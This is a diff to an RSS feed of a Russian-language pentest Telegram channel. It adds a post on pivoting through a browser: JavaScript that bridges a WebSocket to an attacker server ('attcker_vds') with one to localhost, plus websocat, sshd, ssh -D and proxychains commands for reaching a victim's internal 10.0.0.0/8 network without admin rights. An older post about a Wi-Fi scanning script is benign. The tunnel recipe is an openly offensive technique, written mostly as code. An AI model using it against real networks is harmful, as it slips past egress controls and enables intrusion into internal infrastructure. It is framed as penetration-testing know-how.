@@ -1,5 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0i37_channel</title><link>https://t.me/s0i37_channel</link><description>none</description><language>ru</language><lastBuildDate>Fri, 10 Apr 2026 08:52:00 +0000</lastBuildDate><item><title>Иногда бывает нужно быстро посмотреть какие беспроводные сети вокруг, и совсем не обязательно для этого каждый раз переключаться в режим монитора, ведь сканирование эфира это штатный функционал любой...</title><link>https://t.me/s0i37_channel/268</link><description>Иногда бывает нужно быстро посмотреть какие беспроводные сети вокруг, и совсем не обязательно для этого каждый раз переключаться в режим монитора, ведь сканирование эфира это штатный функционал любой сетевой карты. На Linux просмотр беспроводных сетей можно производить с помощью встроенной утилиты iw, дающий очень много информации про каждую точку доступа, что не очень удобно для быстрого просмотра.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>s0i37_channel</title><link>https://t.me/s0i37_channel</link><description>none</description><language>ru</language><lastBuildDate>Thu, 30 Apr 2026 07:47:53 +0000</lastBuildDate><item><title>Пробрасываем сетевой туннель сквозь браузер.</title><link>https://t.me/s0i37_channel/269</link><description>Пробрасываем сетевой туннель сквозь браузер.
+При пентесте бывает так что из локальной сети наружу разрешён только трафик браузера.
+С помощью следующего js-кода мы можем открыть два веб-сокета - один на опорный сервер, другой на локальное приложение, после чего связать их:
+var external = new WebSocket("ws://attcker_vds:80")
+var internal = new WebSocket("ws://localhost:1234")
+external.onopen = function() { external.onmessage = function(event) { internal.send(event.data) } }
+internal.onopen = function() { internal.onmessage = function(event) { external.send(event.data) } }
+Все что будет приходить на один веб-сокет будет тут же уходить на другой и наоборот, словно сокеты связаны пайпом. Тк веб-сокеты не регулируются Same origin policy то вставить этот код можно на любую веб-страницу, открыв консоль разработчика (f12).
+Сквозь браузер на vds и localhost полетит connect да ещё и в виде веб-сокета. Что бы превратить это в обычный listen tcp-сокет на опорном сервере потребуется команда:
+vds&gt; websocat -b ws-l:0.0.0.0:80 tcp-l:0.0.0.0:2222
+а на localhost команда превращающая web-socket connect в tcp-connect:
+victim&gt; sshd.exe
+victim&gt; websocat.exe -b ws-l:127.0.0.1:1234 tcp:127.0.0.1:2222
+Замечательная программа websocat, по аналогии с классическим socat, умеет создавать два, связанных пайпом, сокета или веб-сокета в любой форме connect или listen.
+Теперь после того как на vds и victim веб-сокеты преобразован в обычные tcp, можно открыть любой туннель, например:
+attacker&gt; ssh -D 3128 vds -p2222
+attacker&gt; proxychains ... 10.0.0.0/8
+Схема проброса:
+attacker -&gt; vds &lt;- browser -&gt; victim -&gt; infra
+И снова для пивотинга нам не потребовались административные права.</description><pubDate>Thu, 30 Apr 2026 07:47:53 +0000</pubDate><guid isPermaLink="false">telegram_s0i37_channel_269</guid></item><item><title>Иногда бывает нужно быстро посмотреть какие беспроводные сети вокруг, и совсем не обязательно для этого каждый раз переключаться в режим монитора, ведь сканирование эфира это штатный функционал любой...</title><link>https://t.me/s0i37_channel/268</link><description>Иногда бывает нужно быстро посмотреть какие беспроводные сети вокруг, и совсем не обязательно для этого каждый раз переключаться в режим монитора, ведь сканирование эфира это штатный функционал любой сетевой карты. На Linux просмотр беспроводных сетей можно производить с помощью встроенной утилиты iw, дающий очень много информации про каждую точку доступа, что не очень удобно для быстрого просмотра.
 Я написал небольшой скрипт обёртку над утилитой iw для сканирования Wi-Fi.
 https://github.com/s0i37/wifi/blob/main/scan.sh
 Скрипт можно запускать на любой сетевой карте, даже при активном подключении.
